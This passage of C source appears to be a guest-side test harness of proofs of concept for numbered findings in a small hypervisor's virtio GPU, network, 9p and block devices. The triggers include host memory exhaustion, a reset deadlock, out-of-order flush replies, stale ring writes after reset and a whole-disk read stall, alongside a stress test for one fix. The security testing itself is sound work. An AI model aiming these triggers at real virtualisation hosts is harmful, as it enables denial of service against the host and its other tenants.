	vdev_init(&g.d, 0);
	vq_setup(&g.q, &g.d, 0, 0, h);
	vdev_driver_ok(&g.d);
	g.req = hp_carve(h, 4096, 4096, &g.req_gpa);
	g.resp = hp_carve(h, 4096, 4096, &g.resp_gpa);
	g.big = hp_carve(hbig, GPU_ATTACH_LEN, 4096, &g.big_gpa);

	/* --- Transfer: a 2 x 8192 resource whose backing list is 65535 empty
	 * entries and then the pixels. One column is transferred, so the device
	 * reads it a row at a time. --- */
	const uint32_t XID = 100000, XW = 2, XH = 8192;
	uint32_t r = gpu_create(&g, XID, XW, XH);
	if (r != GPU_RESP_OK_NODATA)
		die("gpu: create 2x8192 -> 0x%x", r);
	memset(g.big, 0, GPU_ATTACH_LEN);
	put32(g.big, GPU_CMD_ATTACH_BACKING);
	put32(g.big + 24, XID);
	put32(g.big + 28, GPU_ENTRIES);
	put64(g.big + 32 + (GPU_ENTRIES - 1) * 16u, hpix->gpa);
	put32(g.big + 32 + (GPU_ENTRIES - 1) * 16u + 8, (uint32_t)HP_SIZE);
	r = gpu_cmd(&g, g.big_gpa, GPU_ATTACH_LEN);
	if (r != GPU_RESP_OK_NODATA)
		die("gpu: attach to the transfer resource -> 0x%x", r);
	/* nxfer transfer commands, one chain each, on one kick. */
	if (nxfer > g.q.size / 2)
		nxfer = g.q.size / 2;
	uint8_t *xreq = g.req;
	memset(xreq, 0, 64);
	put32(xreq, GPU_CMD_TRANSFER_2D);
	put32(xreq + 24, 0);  /* x */
	put32(xreq + 28, 0);  /* y */
	put32(xreq + 32, 1);  /* width: one column of two */
	put32(xreq + 36, XH); /* height */
	put64(xreq + 40, 0);  /* offset */
	put32(xreq + 48, XID);
	uint8_t *xresp = hp_carve(h, 64u * nxfer, 64, NULL);
	uint64_t xresp_gpa = h->gpa + (uint64_t)(xresp - h->va);
	memset(xresp, 0, 64u * nxfer);
	uint16_t base = vq_used_idx(&g.q);
	for (unsigned i = 0; i < nxfer; i++) {
		vq_desc(&g.q, 2 * i, g.req_gpa, 56, D_NEXT, (uint16_t)(2 * i + 1));
		vq_desc(&g.q, 2 * i + 1, xresp_gpa + 64u * i, 64, D_WRITE, 0);
		g.q.avail[2 + ((g.q.avail_idx + i) % g.q.size)] = (uint16_t)(2 * i);
	}
	say("MARK gpu-xfer-kick transfers=%u rows=%u list_entries=%u", nxfer, XH, GPU_ENTRIES);
	vq_set_avail_idx(&g.q, (uint16_t)(g.q.avail_idx + nxfer));
	double t0 = now_ms();
	vq_kick(&g.q);
	double xms = now_ms() - t0;
	if (vq_wait_used(&g.q, (uint16_t)(base + nxfer), 120000) < 0)
		die("gpu: transfers not answered");
	unsigned xok = 0;
	for (unsigned i = 0; i < nxfer; i++)
		xok += get32(xresp + 64u * i) == GPU_RESP_OK_NODATA;
	say("RESULT gpu-xfer transfers=%u ok=%u kick_ms=%.1f ms_per_transfer=%.2f", nxfer, xok, xms,
	    xms / nxfer);
	memset(g.req, 0, 64);
	put32(g.req, GPU_CMD_UNREF);
	put32(g.req + 24, XID);
	gpu_cmd(&g, g.req_gpa, 32);

	/* --- Memory: a full backing list on each of many 1x1 resources. --- */
	msleep(700); /* let the host sample the VMM's memory at rest */
	say("MARK gpu-attach-begin resources=%u entries_each=%u", nres, GPU_ENTRIES);
	unsigned created = 0, attached = 0, first_err_at = 0;
	uint32_t first_err = 0;
	memset(g.big, 0, GPU_ATTACH_LEN);
	put32(g.big, GPU_CMD_ATTACH_BACKING);
	put32(g.big + 28, GPU_ENTRIES);
	t0 = now_ms();
	for (unsigned id = 1; id <= nres; id++) {
		r = gpu_create(&g, id, 1, 1);
		if (r != GPU_RESP_OK_NODATA) {
			if (!first_err) {
				first_err = r;
				first_err_at = id;
			}
			break;
		}
		created++;
		put32(g.big + 24, id);
		r = gpu_cmd(&g, g.big_gpa, GPU_ATTACH_LEN);
		if (r != GPU_RESP_OK_NODATA) {
			if (!first_err) {
				first_err = r;
				first_err_at = id;
			}
			continue; /* keep asking: a capped device keeps refusing */
		}
		attached++;
	}
	double ams = now_ms() - t0;
	say("RESULT gpu-attach created=%u attached=%u entries_held=%" PRIu64
	    " first_err=0x%x first_err_at=%u ms=%.0f",
	    created, attached, (uint64_t)attached * GPU_ENTRIES, first_err, first_err_at, ams);
	msleep(700);
	say("MARK gpu-attach-end");
	msleep(300);
	return 0;
}

/* ==================================================== net-reset-deadlock */
/* Finding 5: the doorbell pump drains TX holding the TX queue lock and, for
 * each frame the loopback backend echoes, raises the RX interrupt (transport
 * lock). A reset from the vCPU holds the transport lock and wants the queue
 * lock. */

static int poc_net_reset_deadlock(void)
{
	unsigned rounds = (unsigned)opt_u64("rounds", 2000);
	uint32_t frame = (uint32_t)opt_u64("frame", 60000);
	unsigned max_delay = (unsigned)opt_u64("max_delay_us", 3000);
	struct vdev d;
	struct vq rx, tx;
	hp_pool_init(3);
	struct hpage *hr = hp_get(), *ht = hp_get(), *hb = hp_get();
	vdev_open(&d, PCI_ID_NET, 0);
	vdev_init(&d, 0);
	vq_setup(&rx, &d, 0, 0, hr);
	vq_setup(&tx, &d, 1, 0, ht);
	uint64_t rxbuf_gpa, txbuf_gpa;
	hp_carve(hb, 128 << 10, 4096, &rxbuf_gpa);
	uint8_t *txbuf = hp_carve(hb, 128 << 10, 4096, &txbuf_gpa);
	memset(txbuf, 0, 12);	       /* virtio_net_hdr: no offloads */
	memset(txbuf + 12, 0xff, 6);   /* broadcast */
	memset(txbuf + 18, 0x02, 6);
	txbuf[24] = 0x88;
	txbuf[25] = 0xb5; /* local experimental ethertype */
	say("net-reset-deadlock: %u rounds of [%u frames of %u bytes, kick, reset]", rounds, tx.size,
	    frame);
	double t0 = now_ms();
	uint64_t echoed = 0;
	for (unsigned r = 1; r <= rounds; r++) {
		if (r > 1) {
			vdev_init(&d, 0);
			vq_reprogram(&rx);
			vq_reprogram(&tx);
		}
		vdev_driver_ok(&d);
		for (unsigned i = 0; i < rx.size; i++) {
			vq_desc(&rx, i, rxbuf_gpa, 12 + frame, D_WRITE, 0);
			rx.avail[2 + i] = (uint16_t)i;
		}
		vq_set_avail_idx(&rx, rx.size);
		for (unsigned i = 0; i < tx.size; i++) {
			vq_desc(&tx, i, txbuf_gpa, 12 + frame, 0, 0);
			tx.avail[2 + i] = (uint16_t)i;
		}
		vq_set_avail_idx(&tx, tx.size);
		if (r <= 10 || r % 50 == 0)
			say("MARK net-round %u", r);
		vq_kick(&tx);
		spin_us((r * 137u) % (max_delay + 1));
		/* The reset: on a deadlocked VMM this store never returns. */
		mw8(d.common + CC_STATUS, 0);
		double tr = now_ms();
		while (vdev_status(&d) != 0) {
			if (now_ms() - tr > 10000)
				die("net: reset did not complete");
			spin_us(20);
		}
		echoed += vq_used_idx(&rx);
	}
	say("RESULT net-reset-deadlock rounds_completed=%u ms=%.0f frames_echoed=%" PRIu64, rounds,
	    now_ms() - t0, echoed);
	return 0;
}

/* ==================================================================== 9p */

#define P9_TLOPEN 12
#define P9_TGETATTR 24
#define P9_TREADDIR 40
#define P9_TVERSION 100
#define P9_TATTACH 104
#define P9_TFLUSH 108
#define P9_TWALK 110
#define P9_TCLUNK 120
#define P9_RLERROR 7
#define P9_RFLUSH 109
#define P9_RREADDIR 41
#define P9_NOFID 0xffffffffu
#define P9_SLOTS 4
#define P9_TCAP (64u << 10)
#define P9_RCAP (128u << 10)

struct p9 {
	struct vdev d;
	struct vq q;
	struct hpage *hbuf;
	uint8_t *t[P9_SLOTS], *r[P9_SLOTS];
	uint64_t t_gpa[P9_SLOTS], r_gpa[P9_SLOTS];
	uint32_t tlen[P9_SLOTS];
	uint16_t tag;
};

static void p9_open(struct p9 *c, struct hpage *hring, struct hpage *hbuf)
{
	memset(c, 0, sizeof *c);
	vdev_open(&c->d, PCI_ID_9P, 0);
	vdev_init(&c->d, 1 /* MOUNT_TAG */);
	vq_setup(&c->q, &c->d, 0, 0, hring);
	vdev_driver_ok(&c->d);
	c->hbuf = hbuf;
	for (int s = 0; s < P9_SLOTS; s++) {
		c->t[s] = hp_carve(hbuf, P9_TCAP, 4096, &c->t_gpa[s]);
		c->r[s] = hp_carve(hbuf, P9_RCAP, 4096, &c->r_gpa[s]);
	}
	c->tag = 1;
}

/* T-message builder for slot s. */
static uint8_t *p9_begin(struct p9 *c, int s, uint8_t type, uint16_t tag)
{
	uint8_t *p = c->t[s];
	p[4] = type;
	memcpy(p + 5, &tag, 2);
	c->tlen[s] = 7;
	return p;
}
static void p9_u16(struct p9 *c, int s, uint16_t v)
{
	memcpy(c->t[s] + c->tlen[s], &v, 2);
	c->tlen[s] += 2;
}
static void p9_u32(struct p9 *c, int s, uint32_t v)
{
	memcpy(c->t[s] + c->tlen[s], &v, 4);
	c->tlen[s] += 4;
}
static void p9_u64(struct p9 *c, int s, uint64_t v)
{
	memcpy(c->t[s] + c->tlen[s], &v, 8);
	c->tlen[s] += 8;
}
static void p9_str(struct p9 *c, int s, const char *str, size_t n)
{
	if (c->tlen[s] + 2 + n > P9_TCAP)
		die("9p: T-message too long");
	p9_u16(c, s, (uint16_t)n);
	memcpy(c->t[s] + c->tlen[s], str, n);
	c->tlen[s] += (uint32_t)n;
}

/* Put slot s's request on the ring (descriptors 2s and 2s+1). No kick. */
static void p9_queue(struct p9 *c, int s)
{
	memcpy(c->t[s], &c->tlen[s], 4);
	memset(c->r[s], 0, 16);
	vq_desc(&c->q, 2 * s, c->t_gpa[s], c->tlen[s], D_NEXT, (uint16_t)(2 * s + 1));
	vq_desc(&c->q, 2 * s + 1, c->r_gpa[s], P9_RCAP, D_WRITE, 0);
	vq_publish(&c->q, (uint16_t)(2 * s));
}

/* Send slot s's request and wait for its reply. Returns the R type. */
static uint8_t p9_rpc(struct p9 *c, int s)
{
	uint16_t want = (uint16_t)(vq_used_idx(&c->q) + 1);
	p9_queue(c, s);
	vq_kick(&c->q);
	if (vq_wait_used(&c->q, want, 30000) < 0)
		die("9p: request type %u got no reply in 30 s", c->t[s][4]);
	return c->r[s][4];
}

static uint32_t p9_errno(struct p9 *c, int s)
{
	return c->r[s][4] == P9_RLERROR ? get32(c->r[s] + 7) : 0;
}

static void p9_expect(struct p9 *c, int s, uint8_t rtype, const char *what)
{
	uint8_t got = p9_rpc(c, s);
	if (got != rtype)
		die("9p: %s: reply type %u (errno %u), wanted %u", what, got, p9_errno(c, s), rtype);
}

static void p9_version_attach(struct p9 *c, uint32_t msize)
{
	p9_begin(c, 0, P9_TVERSION, 0xffff);
	p9_u32(c, 0, msize);
	p9_str(c, 0, "9P2000.L", 8);
	p9_expect(c, 0, P9_TVERSION + 1, "Tversion");
	p9_begin(c, 0, P9_TATTACH, c->tag++);
	p9_u32(c, 0, 0); /* fid 0 = the share root */
	p9_u32(c, 0, P9_NOFID);
	p9_str(c, 0, "root", 4);
	p9_str(c, 0, "", 0);
	p9_u32(c, 0, 0);
	p9_expect(c, 0, P9_TATTACH + 1, "Tattach");
}

/* Twalk fid -> newfid over `n` names of `len` bytes each (all `name`).
 * Returns the reply type. */
static uint8_t p9_walk(struct p9 *c, uint32_t fid, uint32_t newfid, unsigned n, const char *name,
		       size_t len)
{
	p9_begin(c, 0, P9_TWALK, c->tag++);
	p9_u32(c, 0, fid);
	p9_u32(c, 0, newfid);
	p9_u16(c, 0, (uint16_t)n);
	for (unsigned i = 0; i < n; i++)
		p9_str(c, 0, name, len);
	return p9_rpc(c, 0);
}

static void p9_clunk(struct p9 *c, uint32_t fid)
{
	p9_begin(c, 0, P9_TCLUNK, c->tag++);
	p9_u32(c, 0, fid);
	p9_rpc(c, 0);
}

/* ------------------------------------------------------- p9-flush-order */
/* Finding 8: a Tflush was answered at once, ahead of the request it flushes. */

static int poc_p9_flush_order(void)
{
	unsigned trials = (unsigned)opt_u64("trials", 8);
	unsigned wait_ms = (unsigned)opt_u64("wait_ms", 60000);
	const char *dir = opt_str("dir", "big");
	struct p9 c;
	hp_pool_init(3);
	struct hpage *hring = hp_get(), *hbuf = hp_get();
	p9_open(&c, hring, hbuf);
	p9_version_attach(&c, 65536);
	unsigned flush_first = 0, readdir_first = 0, late_reply = 0;
	double sum_first = 0, sum_second = 0;
	for (unsigned t = 0; t < trials; t++) {
		uint32_t fid = 100 + t;
		if (p9_walk(&c, 0, fid, 1, dir, strlen(dir)) != P9_TWALK + 1)
			die("9p: walk to '%s': errno %u", dir, p9_errno(&c, 0));
		p9_begin(&c, 0, P9_TLOPEN, c.tag++);
		p9_u32(&c, 0, fid);
		p9_u32(&c, 0, 0x10000); /* O_RDONLY | O_DIRECTORY */
		p9_expect(&c, 0, P9_TLOPEN + 1, "Tlopen");

		/* Treaddir in slot 1, then the Tflush of its tag in slot 2: both on
		 * the ring, in that order, before the one kick. */
		uint16_t rd_tag = c.tag++, fl_tag = c.tag++;
		p9_begin(&c, 1, P9_TREADDIR, rd_tag);
		p9_u32(&c, 1, fid);
		p9_u64(&c, 1, 0);
		p9_u32(&c, 1, 32768);
		p9_begin(&c, 2, P9_TFLUSH, fl_tag);
		p9_u16(&c, 2, rd_tag);
		uint16_t base = vq_used_idx(&c.q);
		p9_queue(&c, 1);
		if (opt_u64("noflush", 0)) { /* diagnostic: the Treaddir alone */
			double t1 = now_ms();
			vq_kick(&c.q);
			int got = vq_wait_used(&c.q, (uint16_t)(base + 1), wait_ms) == 0;
			say("p9-flush-order trial %u (no Tflush): Treaddir answered=%d after %.1f ms, "
			    "reply type %u, %u bytes",
			    t, got, now_ms() - t1, c.r[1][4], get32(c.r[1]));
			if (!got)
				die("9p: Treaddir alone got no reply in %u ms", wait_ms);
			p9_clunk(&c, fid);
			continue;
		}
		p9_queue(&c, 2);
		double t0 = now_ms();
		vq_kick(&c.q);
		/* The first reply; note what the Treaddir's buffer holds then. */
		if (vq_wait_used(&c.q, (uint16_t)(base + 1), wait_ms) < 0)
			die("9p: neither the Treaddir nor its Tflush was answered in %u ms "
			    "(used.idx still %u)",
			    wait_ms, vq_used_idx(&c.q));
		double first_ms = now_ms() - t0;
		uint32_t id0, len0;
		vq_used_elem(&c.q, base, &id0, &len0);
		uint8_t rd_type_at_first = c.r[1][4];
		if (vq_wait_used(&c.q, (uint16_t)(base + 2), wait_ms) < 0)
			die("9p: only one of Treaddir/Tflush was answered in %u ms (the %s)", wait_ms,
			    id0 == 4 ? "Tflush" : "Treaddir");
		double second_ms = now_ms() - t0;
		int flush_was_first = id0 == 4; /* slot 2's head descriptor */
		sum_first += first_ms;
		sum_second += second_ms;
		if (flush_was_first) {
			flush_first++;
			/* The Rreaddir landed in its buffer after the Rflush. */
			if (rd_type_at_first == 0 && c.r[1][4] != 0)
				late_reply++;
		} else {
			readdir_first++;
		}
		say("p9-flush-order trial %u: first=%s at %.1f ms, second at %.1f ms; replies: "
		    "readdir=%u (%u bytes) flush=%u",
		    t, flush_was_first ? "Rflush" : "Rreaddir", first_ms, second_ms, c.r[1][4],
		    get32(c.r[1]), c.r[2][4]);
		p9_clunk(&c, fid);
	}
	say("RESULT p9-flush-order trials=%u rflush_first=%u rreaddir_first=%u "
	    "reply_written_after_rflush=%u first_reply_ms=%.2f second_reply_ms=%.2f",
	    trials, flush_first, readdir_first, late_reply, trials ? sum_first / trials : 0,
	    trials ? sum_second / trials : 0);
	return 0;
}

/* ------------------------------------------------------ p9-flush-stress */
/* Functional, for the Tflush bookkeeping that fixes finding 8: batches of a
 * Treaddir and many Tflushes that name it, each other, themselves and
 * nothing, with a device reset thrown in mid-flight now and then. Every
 * request must get one reply, no Rflush may precede the reply of the request
 * it flushes, and the device must come back from every reset. */

#define FS_MAX 48

static int poc_p9_flush_stress(void)
{
	unsigned rounds = (unsigned)opt_u64("rounds", 300);
	unsigned nflush = (unsigned)opt_u64("flushes", 40);
	unsigned reset_every = (unsigned)opt_u64("reset_every", 7);
	const char *dir = opt_str("dir", "big");
	if (nflush > FS_MAX)
		nflush = FS_MAX;
	struct p9 c;
	hp_pool_init(4);
	struct hpage *hring = hp_get(), *hbuf = hp_get(), *hx = hp_get();
	p9_open(&c, hring, hbuf);
	p9_version_attach(&c, 65536);
	/* Flush slots: descriptors 8 + 2i (T) and 9 + 2i (R). */
	uint8_t *ft[FS_MAX], *fr[FS_MAX];
	uint64_t ft_gpa[FS_MAX], fr_gpa[FS_MAX];
	for (unsigned i = 0; i < nflush; i++) {
		ft[i] = hp_carve(hx, 64, 64, &ft_gpa[i]);
		fr[i] = hp_carve(hx, 64, 64, &fr_gpa[i]);
	}
	unsigned order_violations = 0, lost = 0, wrong = 0, resets = 0, batches = 0;
	double max_reset_ms = 0, max_batch_ms = 0;
	for (unsigned r = 0; r < rounds; r++) {
		uint32_t fid = 100 + r;
		if (p9_walk(&c, 0, fid, 1, dir, strlen(dir)) != P9_TWALK + 1)
			die("9p stress: walk in round %u: errno %u", r, p9_errno(&c, 0));
		p9_begin(&c, 0, P9_TLOPEN, c.tag++);
		p9_u32(&c, 0, fid);
		p9_u32(&c, 0, 0x10000);
		p9_expect(&c, 0, P9_TLOPEN + 1, "Tlopen");

		uint16_t rd_tag = c.tag++;
		p9_begin(&c, 1, P9_TREADDIR, rd_tag);
		p9_u32(&c, 1, fid);
		p9_u64(&c, 1, 0);
		p9_u32(&c, 1, 32768);
		uint16_t ftag[FS_MAX];
		int target[FS_MAX]; /* -1 readdir, >= 0 an earlier flush, -2 none to check */
		for (unsigned i = 0; i < nflush; i++)
			ftag[i] = c.tag++;
		for (unsigned i = 0; i < nflush; i++) {
			uint16_t old;
			switch ((i + r) % 6) {
			case 0: /* the Treaddir */
				old = rd_tag;
				target[i] = -1;
				break;
			case 1: /* the Tflush before this one */
				old = i ? ftag[i - 1] : rd_tag;
				target[i] = i ? (int)i - 1 : -1;
				break;
			case 2: /* itself */
				old = ftag[i];
				target[i] = -2;
				break;
			case 3: /* a tag nothing has */
				old = 0x7777;
				target[i] = -2;
				break;
			case 4: /* the next Tflush, which names this one back */
				old = i + 1 < nflush ? ftag[i + 1] : rd_tag;
				target[i] = i + 1 < nflush ? -2 : -1;
				break;
			default: /* the one before (the other half of the pair) */
				old = i ? ftag[i - 1] : rd_tag;
				target[i] = i ? -2 : -1;
				break;
			}
			uint32_t len = 9;
			memcpy(ft[i], &len, 4);
			ft[i][4] = P9_TFLUSH;
			memcpy(ft[i] + 5, &ftag[i], 2);
			memcpy(ft[i] + 7, &old, 2);
			memset(fr[i], 0, 16);
		}
		uint16_t base = vq_used_idx(&c.q);
		p9_queue(&c, 1);
		for (unsigned i = 0; i < nflush; i++) {
			vq_desc(&c.q, 8 + 2 * i, ft_gpa[i], 9, D_NEXT, (uint16_t)(9 + 2 * i));
			vq_desc(&c.q, 9 + 2 * i, fr_gpa[i], 64, D_WRITE, 0);
			vq_publish(&c.q, (uint16_t)(8 + 2 * i));
		}
		double t0 = now_ms();
		vq_kick(&c.q);
		if (reset_every && r % reset_every == reset_every - 1) {
			/* Reset with the batch in flight, then bring the device back. */
			spin_us((r * 53u) % 400);
			double ms = vdev_reset(&c.d);
			if (ms > max_reset_ms)
				max_reset_ms = ms;
			resets++;
			struct vdev *d = &c.d;
			mw8(d->common + CC_STATUS, ST_ACK);
			mw8(d->common + CC_STATUS, ST_ACK | ST_DRIVER);
			mw32(d->common + CC_GFSEL, 0);
			mw32(d->common + CC_GF, 1);
			mw32(d->common + CC_GFSEL, 1);
			mw32(d->common + CC_GF, 1);
			mw8(d->common + CC_STATUS, ST_ACK | ST_DRIVER | ST_FEATURES_OK);
			vq_reprogram(&c.q);
			vdev_driver_ok(d);
			c.tag = 1;
			p9_version_attach(&c, 65536);
			continue;
		}
		unsigned want = 1 + nflush;
		if (vq_wait_used(&c.q, (uint16_t)(base + want), 20000) < 0) {
			lost += want - (uint16_t)(vq_used_idx(&c.q) - base);
			say("p9-flush-stress round %u: only %u of %u replies in 20 s", r,
			    (uint16_t)(vq_used_idx(&c.q) - base), want);
			break;
		}
		double ms = now_ms() - t0;
		if (ms > max_batch_ms)
			max_batch_ms = ms;
		batches++;
		/* Where each reply sits in the used ring. */
		int pos_rd = -1, pos_f[FS_MAX];
		for (unsigned i = 0; i < nflush; i++)
			pos_f[i] = -1;
		for (unsigned k = 0; k < want; k++) {
			uint32_t id, len;
			vq_used_elem(&c.q, (uint16_t)(base + k), &id, &len);
			if (id == 2)
				pos_rd = (int)k;
			else if (id >= 8 && id < 8 + 2 * nflush && !(id & 1))
				pos_f[(id - 8) / 2] = (int)k;
			else
				wrong++;
		}
		if (pos_rd < 0 || c.r[1][4] != P9_RREADDIR)
			wrong++;
		for (unsigned i = 0; i < nflush; i++) {
			uint16_t tag;
			memcpy(&tag, fr[i] + 5, 2);
			if (pos_f[i] < 0 || fr[i][4] != P9_RFLUSH || tag != ftag[i]) {
				wrong++;
				continue;
			}
			int t = target[i] == -1 ? pos_rd : target[i] >= 0 ? pos_f[target[i]] : -1;
			if (target[i] != -2 && t > pos_f[i])
				order_violations++;
		}
		p9_clunk(&c, fid);
	}
	/* The device still serves an ordinary request. */
	p9_begin(&c, 0, P9_TGETATTR, c.tag++);
	p9_u32(&c, 0, 0);
	p9_u64(&c, 0, 0x7ff);
	int alive = p9_rpc(&c, 0) == P9_TGETATTR + 1;
	say("RESULT p9-flush-stress batches=%u flushes_each=%u order_violations=%u lost_replies=%u "
	    "wrong_replies=%u resets=%u max_reset_ms=%.1f max_batch_ms=%.1f alive_after=%d",
	    batches, nflush, order_violations, lost, wrong, resets, max_reset_ms, max_batch_ms, alive);
	return 0;
}

/* ------------------------------------------------------------- p9-reset */
/* Finding 13: a reset left the device's place in the old ring. */

static int poc_p9_reset(void)
{
	unsigned warm = (unsigned)opt_u64("requests", 5);
	struct p9 c;
	hp_pool_init(4);
	struct hpage *hring = hp_get(), *hbuf = hp_get(), *hfresh = hp_get();
	p9_open(&c, hring, hbuf);
	p9_version_attach(&c, 65536);
	for (unsigned i = 2; i < warm; i++) {
		p9_begin(&c, 0, P9_TGETATTR, c.tag++);
		p9_u32(&c, 0, 0);
		p9_u64(&c, 0, 0x7ff);
		p9_expect(&c, 0, P9_TGETATTR + 1, "Tgetattr");
	}
	uint16_t served = vq_used_idx(&c.q);
	say("p9-reset: %u requests served on the first rings (used.idx=%u)", c.q.avail_idx, served);

	double reset_ms = vdev_reset(&c.d);

	/* Fresh rings in another hugepage: nothing published (avail.idx 0),
	 * used.idx 0, and patterns where the device has no business writing. */
	struct vdev *d = &c.d;
	struct vq q;
	mw8(d->common + CC_STATUS, ST_ACK);
	mw8(d->common + CC_STATUS, ST_ACK | ST_DRIVER);
	mw32(d->common + CC_GFSEL, 0);
	mw32(d->common + CC_GF, 0);
	mw32(d->common + CC_GFSEL, 1);
	mw32(d->common + CC_GF, 1);
	mw8(d->common + CC_STATUS, ST_ACK | ST_DRIVER | ST_FEATURES_OK);
	vq_setup(&q, d, 0, 0, hfresh);
	uint64_t trap_gpa;
	uint8_t *trap = hp_carve(hfresh, 4096, 4096, &trap_gpa);
	memset(trap, 0x5a, 4096);
	/* Descriptor 0 is what a zeroed avail ring names. */
	vq_desc(&q, 0, trap_gpa, 4096, D_WRITE, 0);
	for (unsigned i = 0; i < q.size; i++) {
		volatile uint32_t *e = (volatile uint32_t *)(q.used + 4 + 8u * i);
		e[0] = 0xa5a5a5a5;
		e[1] = 0xa5a5a5a5;
	}
	vdev_driver_ok(d);

	vq_kick(&q); /* nothing is queued */
	uint16_t max_seen = 0, last = 0;
	unsigned changes = 0;
	double end = now_ms() + 1500;
	while (now_ms() < end) {
		uint16_t u = vq_used_idx(&q);
		if (u != last) {
			changes++;
			last = u;
		}
		if (u > max_seen)
			max_seen = u;
	}
	unsigned touched = 0;
	for (unsigned i = 0; i < q.size; i++) {
		uint32_t id, len;
		vq_used_elem(&q, (uint16_t)i, &id, &len);
		touched += id != 0xa5a5a5a5 || len != 0xa5a5a5a5;
	}
	unsigned trap_changed = 0;
	for (unsigned i = 0; i < 4096; i++)
		trap_changed += trap[i] != 0x5a;
	say("RESULT p9-reset served_before=%u reset_ms=%.1f used_idx_after=%u used_idx_max=%u "
	    "used_idx_changes=%u used_elems_written=%u unqueued_buffer_bytes_written=%u "
	    "buffer_head=%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
	    served, reset_ms, vq_used_idx(&q), max_seen, changes, touched, trap_changed, trap[0],
	    trap[1], trap[2], trap[3], trap[4], trap[5], trap[6], trap[7], trap[8], trap[9], trap[10]);
	return 0;
}

/* -------------------------------------------------------- p9-fid-memory */
/* Finding 10: every fid keeps its own copy of its path; a clone costs one
 * small Twalk. */

static int poc_p9_fid_memory(void)
{
	unsigned depth = (unsigned)opt_u64("depth", 100);
	unsigned namelen = (unsigned)opt_u64("namelen", 250);
	unsigned mb = (unsigned)opt_u64("mb", 0);
	unsigned clones = (unsigned)opt_u64("clones", 8192);
	char name[256];
	size_t nbytes;
	if (mb) { /* U+4E00, three bytes of UTF-8 and one UTF-16 unit */
		if (namelen > 85)
			namelen = 85;
		for (unsigned i = 0; i < namelen; i++)
			memcpy(name + 3 * i, "\xe4\xb8\x80", 3);
		nbytes = 3u * namelen;
	} else {
		if (namelen > 255)
			namelen = 255;
		memset(name, 'd', namelen);
		nbytes = namelen;
	}
	struct p9 c;
	hp_pool_init(3);
	struct hpage *hring = hp_get(), *hbuf = hp_get();
	p9_open(&c, hring, hbuf);
	p9_version_attach(&c, 65536);

	/* Walk fid 1 to the bottom of the chain, 16 names at a time. */
	unsigned at = 0;
	uint32_t src = 0;
	double t0 = now_ms();
	while (at < depth) {
		unsigned n = depth - at < 16 ? depth - at : 16;
		uint8_t rt = p9_walk(&c, src, 1, n, name, nbytes);
		if (rt != P9_TWALK + 1)
			die("9p: walk at depth %u: errno %u", at, p9_errno(&c, 0));
		uint16_t nq;
		memcpy(&nq, c.r[0] + 7, 2);
		if (nq != n)
			die("9p: walk at depth %u got %u of %u names", at, nq, n);
		at += n;
		src = 1;
	}
	uint64_t path_bytes = (uint64_t)depth * nbytes + (depth - 1);
	say("p9-fid-memory: fid 1 is %u levels down, a path of %" PRIu64 " bytes (%.0f ms)", depth,
	    path_bytes, now_ms() - t0);
	msleep(700);
	say("MARK fid-clone-begin clones=%u path_bytes=%" PRIu64, clones, path_bytes);
	unsigned ok = 0, first_err = 0, first_err_at = 0, errs = 0;
	t0 = now_ms();
	for (unsigned i = 0; i < clones; i++) {
		uint8_t rt = p9_walk(&c, 1, 1000 + i, 0, NULL, 0);
		if (rt == P9_TWALK + 1) {
			ok++;
			continue;
		}
		errs++;
		if (!first_err) {
			first_err = p9_errno(&c, 0);
			first_err_at = i;
		}
		if (errs >= 16)
			break; /* refused for good */
	}
	say("RESULT p9-fid-memory clones_ok=%u first_errno=%u first_err_at=%u path_bytes=%" PRIu64
	    " bytes_pinned=%" PRIu64 " ms=%.0f",
	    ok, first_err, first_err_at, path_bytes, (uint64_t)ok * path_bytes, now_ms() - t0);
	msleep(700);
	say("MARK fid-clone-end");
	msleep(300);
	return 0;
}

/* =================================================== blk-whole-disk-stop */
/* One read whose segments all name the same guest buffer and together span
 * the disk, then power off (or, with snapshot=1, ask tinyvmm --save for the
 * snapshot): how long does the VMM take to stop? */

/* tinyvmm's snapshot trigger: CPUID leaf 0x4000DE57, from any ring. Armed
 * (--save), the vCPU stops inside it and the guest never runs again. */
static void snapshot_trigger(uint32_t out[4])
{
	uint32_t a = 0x4000DE57, b = 0, c = 0, d = 0;
	__asm__ volatile("cpuid" : "+a"(a), "=b"(b), "+c"(c), "=d"(d));
	out[0] = a;
	out[1] = b;
	out[2] = c;
	out[3] = d;
}

static int poc_blk_whole_disk_stop(void)
{
	uint64_t gpa = opt_u64("gpa", 0);
	uint64_t seglen = opt_u64("seglen", 1ull << 30);
	unsigned nsegs = (unsigned)opt_u64("nsegs", 250);
	unsigned settle_ms = (unsigned)opt_u64("settle_ms", 500);
	unsigned nreq = (unsigned)opt_u64("nreq", 1);
	int snapshot = opt_u64("snapshot", 0) != 0;
	if (!gpa)
		die("blk-whole-disk-stop: gpa= is required");
	struct vdev d;
	struct vq q;
	hp_pool_init(2);
	struct hpage *h = hp_get();
	vdev_open(&d, PCI_ID_BLK, 0);
	vdev_init(&d, 0);
	vq_setup(&q, &d, 0, 0, h);
	vdev_driver_ok(&d);
	uint64_t cap = mr32(d.devcfg) | (uint64_t)mr32(d.devcfg + 4) << 32;
	if (nsegs > (unsigned)q.size - 2)
		nsegs = q.size - 2;
	if ((uint64_t)nsegs * seglen > cap * 512)
		nsegs = (unsigned)(cap * 512 / seglen);
	uint64_t hdr_gpa, st_gpa;
	uint8_t *hdr = hp_carve(h, 16, 64, &hdr_gpa);
	uint8_t *st = hp_carve(h, 64, 64, &st_gpa);
	memset(hdr, 0, 16); /* VIRTIO_BLK_T_IN, sector 0 */
	*st = 0xaa;

	/* An honest 4 KiB read first. */
	uint64_t small_gpa;
	hp_carve(h, 4096, 4096, &small_gpa);
	vq_desc(&q, 0, hdr_gpa, 16, D_NEXT, 1);
	vq_desc(&q, 1, small_gpa, 4096, D_WRITE | D_NEXT, 2);
	vq_desc(&q, 2, st_gpa, 1, D_WRITE, 0);
	vq_publish(&q, 0);
	vq_kick(&q);
	if (vq_wait_used(&q, 1, 5000) < 0 || *st != 0)
		die("blk: the honest read failed (status 0x%x)", *st);
	say("blk-whole-disk-stop: honest 4 KiB read ok; disk is %" PRIu64 " MiB", cap * 512 >> 20);

	*st = 0xaa;
	vq_desc(&q, 0, hdr_gpa, 16, D_NEXT, 1);
	for (unsigned i = 0; i < nsegs; i++)
		vq_desc(&q, 1 + i, gpa, (uint32_t)seglen, D_WRITE | D_NEXT, (uint16_t)(2 + i));
	vq_desc(&q, 1 + nsegs, st_gpa, 1, D_WRITE, 0);
